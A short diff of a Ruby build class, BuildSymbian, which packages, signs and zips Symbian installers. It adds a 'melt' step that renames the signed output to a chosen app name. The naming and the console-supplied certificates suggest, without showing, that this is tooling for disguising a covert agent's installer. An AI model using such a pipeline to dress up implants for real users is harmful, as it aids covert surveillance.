@@ -19,7 +19,6 @@ class BuildSymbian < Build
   end
 
   def patch(params)
-
     trace :debug, "Build: patching: #{params}"
 
     # add the file to be patched to the params
@@ -35,6 +34,12 @@ class BuildSymbian < Build
     # invoke the generic patch method with the new params
     super
 
+  end
+
+  def melt(params)
+    trace :debug, "Build: melting: #{params}"
+
+    @appname = params['appname'] || 'install'
   end
 
   def sign(params)
@@ -92,6 +97,8 @@ class BuildSymbian < Build
 
     trace :debug, "Build: creating sisx files"
 
+    params['cert'] or raise "no cert provided"
+    
     # this file is provided by the console
     FileUtils.mv(File.join(Dir.tmpdir, params['cert']), path('symbian.cer'))
     # this is global
@@ -108,15 +115,18 @@ class BuildSymbian < Build
     CrossPlatform.exec path('makesis'), "installer-#{params['edition']}.pkg installer.sis", {chdir: path('')}
     File.exist? path('installer.sis') or raise("makesis failed for installer")
 
-    CrossPlatform.exec path('signsis'), "-s installer.sis installer.sisx symbian.cer symbian.key", {chdir: path('')}
-    File.exist? path('installer.sisx') or raise("signsis failed for installer")
+    CrossPlatform.exec path('signsis'), "-s installer.sis #{@appname}.sisx symbian.cer symbian.key", {chdir: path('')}
+    File.exist? path(@appname + '.sisx') or raise("signsis failed for installer")
+
+    @outputs << ['installer.sis', @appname + '.sisx']
+    
   end
 
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.open('installer.sisx', "w") { |f| f.write File.open(path('installer.sisx'), 'rb') {|f| f.read} }
+      z.file.open(@appname + '.sisx', "w") { |f| f.write File.open(path(@appname + '.sisx'), 'rb') {|f| f.read} }
     end
 
     # this is the only file we need to output after this point
